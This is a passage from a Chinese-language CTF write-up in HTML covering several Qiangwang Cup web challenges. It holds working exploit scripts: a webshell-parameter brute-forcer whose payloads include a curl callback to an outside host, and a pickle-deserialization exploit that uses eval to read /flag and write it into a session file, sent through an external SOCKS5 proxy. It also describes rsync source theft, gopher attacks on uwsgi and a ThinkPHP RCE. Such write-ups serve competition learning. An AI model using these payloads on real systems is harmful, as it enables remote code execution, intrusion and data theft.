   <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> post:
       data = {<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.strip</span>():<span class="hljs-string">&#x27;phpinfo();&#x27;</span>}
       <span class="hljs-selector-tag">a</span> = requests<span class="hljs-selector-class">.post</span>(<span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span>+file,data=data)
       <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;PHP Version&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.content</span>:
           print <span class="hljs-string">&#x27;ok&#x27;</span>+<span class="hljs-selector-tag">i</span>
           exit()
       data = {<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.strip</span>():<span class="hljs-string">&#x27;curl http://xss.f1sh.site/?{}.{}.wz5v5x.ceye.io&#x27;</span><span class="hljs-selector-class">.format</span>(file<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;hex&#x27;</span>), <span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;hex&#x27;</span>))}
       <span class="hljs-selector-tag">a</span> = requests<span class="hljs-selector-class">.post</span>(<span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span>+file,data=data)
   <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> get:
       <span class="hljs-selector-tag">a</span> = requests<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span>+file+<span class="hljs-string">&#x27;?&#x27;</span>+<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.strip</span>()+<span class="hljs-string">&#x27;=phpinfo();&#x27;</span>)
       <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;PHP Version&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.content</span>:
           print <span class="hljs-string">&#x27;ok&#x27;</span>+<span class="hljs-selector-tag">i</span>  
           exit()
       data = {<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.strip</span>():<span class="hljs-string">&#x27;curl http://xss.f1sh.site/?{}.{}.wz5v5x.ceye.io&#x27;</span><span class="hljs-selector-class">.format</span>(file<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;hex&#x27;</span>), <span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;hex&#x27;</span>))}
       <span class="hljs-selector-tag">a</span> = requests<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span>+file,params=data)</code></pre><p class="img-container"><img src="https://i.loli.net/2019/05/27/5ceab9accbb9613764.png" alt=""></p>
<p class="img-container"><img src="https://i.loli.net/2019/05/27/5ceab9de7247419404.png" alt=""></p>
<h3 id="babywebbb"><a class="header-link" href="#babywebbb"></a>babywebbb</h3>
<p>扫端口扫到可以匿名访问的 rsync ，获得源码</p>
<pre class="hljs"><code>rsync -avz <span class="hljs-number">49.4</span>.<span class="hljs-number">71.212</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:src/backup_old</span>.zip ./</code></pre><p>注入登录 + gopher 攻击 uwsgi</p>
<p class="img-container"><img src="https://i.loli.net/2019/05/27/5ceabaaf5011425267.png" alt=""></p>
<p class="img-container"><img src="https://i.loli.net/2019/05/27/5ceabac0992ae46850.png" alt=""></p>
<p>内网172.16.17.4:1080有 socks5 代理，使用它可以访问到内网192.168.223.222的 web 服务，其使用了文件 session ，使用 save errorlog 覆盖 session 文件来控制内容， pickle 反序列化把 flag 写进 session 中的用户名，然后在 information 可以看到 flag</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> pickle

<span class="hljs-title">def</span> add(url, cookie, proxy, payload):
   url += <span class="hljs-string">&quot;/adduser&quot;</span>
   <span class="hljs-class"><span class="hljs-keyword">data</span> = {
       &quot;<span class="hljs-title">username</span>&quot;: <span class="hljs-title">payload</span>,
       &quot;<span class="hljs-title">password</span>&quot;: &quot;123&quot;,
       &quot;<span class="hljs-title">submit</span>&quot;: &quot;<span class="hljs-title">submit</span>&quot;
   }</span>
   requests.post(url, <span class="hljs-class"><span class="hljs-keyword">data</span> = <span class="hljs-keyword">data</span>, cookies = cookie, proxies = proxy)</span>

<span class="hljs-title">def</span> save(url, cookie, porxy):
   url += <span class="hljs-string">&quot;/savelog&quot;</span>
   <span class="hljs-class"><span class="hljs-keyword">data</span> = {
       &quot;<span class="hljs-title">filepath</span>&quot;: &#x27;<span class="hljs-title">session</span>\\\\9<span class="hljs-title">d2b8697</span>-<span class="hljs-title">ae09</span>-4<span class="hljs-title">df4</span>-<span class="hljs-title">b035</span>-27<span class="hljs-title">e16c4f83ee&#x27;</span>,
       &quot;<span class="hljs-title">submit</span>&quot;: &#x27;<span class="hljs-type">Save</span>&#x27;
   }</span>
   requests.post(url, <span class="hljs-class"><span class="hljs-keyword">data</span> = <span class="hljs-keyword">data</span>, cookies = cookie, proxies = proxy)</span>

<span class="hljs-title">def</span> exp(url, proxy):
   url += <span class="hljs-string">&quot;/information&quot;</span>
   cookie = {
       <span class="hljs-string">&quot;QWB_SESSION&quot;</span>: <span class="hljs-string">&quot;9d2b8697-ae09-4df4-b035-27e16c4f83ee.DPeuP5ykMup19ulT02B5L_1LAj8&quot;</span>
   }
   requests.get(url, cookies = cookie, proxies = proxy)
<span class="hljs-class">
<span class="hljs-keyword">class</span> <span class="hljs-type">A</span>(<span class="hljs-title">object</span>):
   def __reduce__(<span class="hljs-title">self</span>):
       #a = &quot;open(&#x27;/<span class="hljs-type">Users</span>/<span class="hljs-title">f1sh</span>/<span class="hljs-type">Downloads</span>/<span class="hljs-title">qwb</span>/<span class="hljs-title">web4</span>/696611<span class="hljs-title">eb</span>-41<span class="hljs-title">f8</span>-4145-967<span class="hljs-title">d</span>-<span class="hljs-title">d4c5e93c5936&#x27;</span>,&#x27;<span class="hljs-title">wb&#x27;</span>).write(\<span class="hljs-title">n</span>\<span class="hljs-title">tbytes</span>(&#x27;(<span class="hljs-title">dp0</span>\\<span class="hljs-title">nS</span>\\&#x27;<span class="hljs-title">username</span>\\&#x27;\\<span class="hljs-title">np1</span>\\<span class="hljs-title">nS</span>\\&#x27;&#x27; + (<span class="hljs-title">open</span>(&#x27;/<span class="hljs-title">flag&#x27;</span>,&#x27;<span class="hljs-title">r&#x27;</span>).read().strip()) + &#x27;\\&#x27;\\np2\\ns.&#x27;, &#x27;utf-8&#x27;)\n)\n&quot;
       a = &quot;open(&#x27;/<span class="hljs-title">home</span>/<span class="hljs-title">qwb</span>/<span class="hljs-title">session</span>/<span class="hljs-title">dc8af170</span>-67<span class="hljs-title">fb</span>-4019-9<span class="hljs-title">a50</span>-4<span class="hljs-title">ca21dc789d6&#x27;</span>,&#x27;<span class="hljs-title">wb&#x27;</span>).write(\<span class="hljs-title">n</span>\<span class="hljs-title">tbytes</span>(&#x27;(<span class="hljs-title">dp0</span>\\<span class="hljs-title">nS</span>\\&#x27;<span class="hljs-title">username</span>\\&#x27;\\<span class="hljs-title">np1</span>\\<span class="hljs-title">nS</span>\\&#x27;&#x27; + (<span class="hljs-title">open</span>(&#x27;/<span class="hljs-title">flag&#x27;</span>,&#x27;<span class="hljs-title">r&#x27;</span>).read().strip()) + &#x27;\\&#x27;\\np2\\ns.&#x27;, &#x27;utf-8&#x27;)\n)\n&quot;
       return (<span class="hljs-title">eval</span>,(<span class="hljs-title">a</span>,))  
 
b = <span class="hljs-type">A</span>()
result = pickle.dumps(<span class="hljs-title">b</span>)
url = &quot;http://192.168.223.222&quot;
cookie = {
   &quot;<span class="hljs-type">QWB_SESSION</span>&quot;: &quot;696611eb-41f8-4145-967d-d4c5e93c5936.vbD5yLe1pB-<span class="hljs-type">RCCefb5SSlOz78Bc</span>&quot;
}
proxy = {
   &quot;http&quot;: &quot;socks5://139.199.27.197:6001&quot;,
   &quot;https&quot;: &quot;socks5://139.199.27.197:6001&quot;
}
for i in xrange(10):
   add(<span class="hljs-title">url</span>, <span class="hljs-title">cookie</span>, <span class="hljs-title">proxy</span>, <span class="hljs-title">result</span>)
   save(<span class="hljs-title">url</span>, <span class="hljs-title">cookie</span>, <span class="hljs-title">proxy</span>)
   exp(<span class="hljs-title">url</span>, <span class="hljs-title">proxy</span>)</span></code></pre><p class="img-container"><img src="https://i.loli.net/2019/05/27/5ceabb5958cb799081.png" alt=""></p>
<h3 id="强网先锋-上单"><a class="header-link" href="#强网先锋-上单"></a>强网先锋-上单</h3>
<p>thinkphp rce:</p>
<p class="img-container"><img src="https://i.loli.net/2019/05/27/5ceabb83463d723676.png" alt=""></p>
        </article>
      </div>
    </div>
  </body>
</html>
<!--
    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
    Respective Copyrights apply.
 -->
